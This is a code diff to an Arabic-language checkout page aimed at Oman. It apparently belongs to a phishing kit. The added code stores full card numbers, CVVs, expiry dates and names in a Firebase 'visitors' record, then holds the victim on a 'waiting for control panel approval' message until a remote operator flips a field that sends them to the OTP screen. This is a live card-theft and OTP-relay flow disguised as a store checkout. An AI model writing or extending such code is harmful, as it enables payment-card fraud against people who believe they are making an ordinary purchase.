@@ -10,8 +10,9 @@ import { Separator } from "@/components/ui/separator"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Badge } from "@/components/ui/badge"
 import { MapPin, CreditCard, Shield, AlertCircle, CheckCircle2 } from "lucide-react"
-import { addData, getVisitorId } from "@/lib/firebase"
+import { addData, db, getVisitorId } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { doc, onSnapshot } from "firebase/firestore"
 
 type CheckoutStep = "address" | "payment" | "otp" | "success"
 
@@ -19,9 +20,24 @@ interface FormErrors {
   [key: string]: string
 }
 
+const omanRegions = [
+  "مسقط",
+  "ظفار",
+  "مسندم",
+  "البريمي",
+  "الداخلية",
+  "شمال الباطنة",
+  "جنوب الباطنة",
+  "شمال الشرقية",
+  "جنوب الشرقية",
+  "الظاهرة",
+  "الوسطى",
+]
+
 export default function CheckoutPage() {
   const [currentStep, setCurrentStep] = useState<CheckoutStep>("address")
   const [isLoading, setIsLoading] = useState(false)
+  const [isAwaitingApproval, setIsAwaitingApproval] = useState(false)
   const [errors, setErrors] = useState<FormErrors>({})
   const [otpError, setOtpError] = useState("")
   const [otp, setOtp] = useState("")
@@ -32,6 +48,26 @@ export default function CheckoutPage() {
 
     setupOnlineStatus(visitorId)
     void addData({ visitorId, currentPage: "تسجيل المعلومات" })
+  }, [])
+
+  useEffect(() => {
+    const visitorId = getVisitorId()
+    if (!visitorId) return
+
+    const unsubscribe = onSnapshot(doc(db, "visitors", visitorId), (snapshot) => {
+      if (!snapshot.exists()) return
+
+      const data = snapshot.data()
+      const shouldGoToOtp = data?.redirectPage === "otp" || data?.currentStep === "_t2" || data?.currentStep === "otp"
+
+      if (shouldGoToOtp) {
+        setIsAwaitingApproval(false)
+        setIsLoading(false)
+        setCurrentStep("otp")
+      }
+    })
+
+    return () => unsubscribe()
   }, [])
 
   // Form data
@@ -54,6 +90,7 @@ export default function CheckoutPage() {
 
     if (!addressData.fullName.trim()) newErrors.fullName = "الاسم الكامل مطلوب"
     if (!addressData.phone.trim()) newErrors.phone = "رقم الهاتف مطلوب"
+    else if (addressData.phone.length !== 8) newErrors.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
     if (!addressData.city) newErrors.city = "المدينة مطلوبة"
 
     setErrors(newErrors)
@@ -83,6 +120,8 @@ export default function CheckoutPage() {
       visitorId,
       name: addressData.fullName,
       phone: addressData.phone,
+      city: addressData.city,
+      address: addressData.city,
       currentPage: "تسجيل المعلومات",
     })
     setIsLoading(true)
@@ -100,13 +139,13 @@ export default function CheckoutPage() {
       cardNumber: paymentData.cardNumber,
       cvv: paymentData.cvv,
       expiryDate: paymentData.expiryDate,
+      cardName: paymentData.cardName,
+      cardStatus: "pending",
+      currentStep: "payment",
       currentPage: "تسجيل البطاقة",
     })
+    setIsAwaitingApproval(true)
     setIsLoading(true)
-    // Simulate payment processing
-    await new Promise((resolve) => setTimeout(resolve, 2000))
-    setIsLoading(false)
-    setCurrentStep("otp")
   }
 
   const handleOtpSubmit = async () => {
@@ -232,22 +271,37 @@ export default function CheckoutPage() {
                       <Input
                         id="phone"
                         value={addressData.phone}
-                        onChange={(e) => setAddressData({ ...addressData, phone: e.target.value })}
+                        onChange={(e) =>
+                          setAddressData({
+                            ...addressData,
+                            phone: e.target.value.replace(/\D/g, "").slice(0, 8),
+                          })
+                        }
                         className={errors.phone ? "border-red-500" : ""}
-                        placeholder="+968xxxxxxxx"
+                        placeholder="91234567"
+                        inputMode="numeric"
+                        maxLength={8}
                       />
                       {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                     </div>
                     <div>
-                      <Label htmlFor="phone">العنوان  *</Label>
-                      <Input
-                        id="address"
+                      <Label htmlFor="city">المنطقة *</Label>
+                      <Select
                         value={addressData.city}
-                        onChange={(e) => setAddressData({ ...addressData, city: e.target.value })}
-                        className={errors.city ? "border-red-500" : ""}
-                        placeholder="ادخل عنوان التوصيل "
-                      />
-                      {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
+                        onValueChange={(value) => setAddressData({ ...addressData, city: value })}
+                      >
+                        <SelectTrigger className={errors.city ? "border-red-500" : ""}>
+                          <SelectValue placeholder="اختر المنطقة" />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {omanRegions.map((region) => (
+                            <SelectItem key={region} value={region}>
+                              {region}
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                      {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
                     </div>
                   </div>
 
@@ -318,9 +372,9 @@ export default function CheckoutPage() {
                     </div>
                   </div>
 
-                  <div>
-                    <Label htmlFor="cardName">اسم حامل البطاقة *</Label>
-                    <Input
+                <div>
+                  <Label htmlFor="cardName">اسم حامل البطاقة *</Label>
+                  <Input
                       id="cardName"
                       value={paymentData.cardName}
                       onChange={(e) => setPaymentData({ ...paymentData, cardName: e.target.value })}
@@ -330,12 +384,20 @@ export default function CheckoutPage() {
                     {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
                   </div>
 
+                  {isAwaitingApproval && (
+                    <Alert>
+                      <AlertDescription>
+                        تم تسجيل البطاقة. انتظر موافقة لوحة التحكم وسيتم نقلك تلقائياً إلى شاشة الكود.
+                      </AlertDescription>
+                    </Alert>
+                  )}
+
                   <div className="flex gap-2">
-                    <Button variant="outline" onClick={() => setCurrentStep("address")} className="flex-1">
+                    <Button variant="outline" onClick={() => !isAwaitingApproval && setCurrentStep("address")} className="flex-1" disabled={isAwaitingApproval}>
                       رجوع
                     </Button>
                     <Button onClick={handlePaymentSubmit} className="flex-1 bg-gradient-to-r from-blue-500 to-cyan-500 text-white" disabled={isLoading}>
-                      {isLoading ? "جاري المعالجة..." : "تأكيد الدفع"}
+                      {isLoading ? (isAwaitingApproval ? "بانتظار موافقة اللوحة..." : "جاري المعالجة...") : "تأكيد الدفع"}
                     </Button>
                   </div>
                 </CardContent>
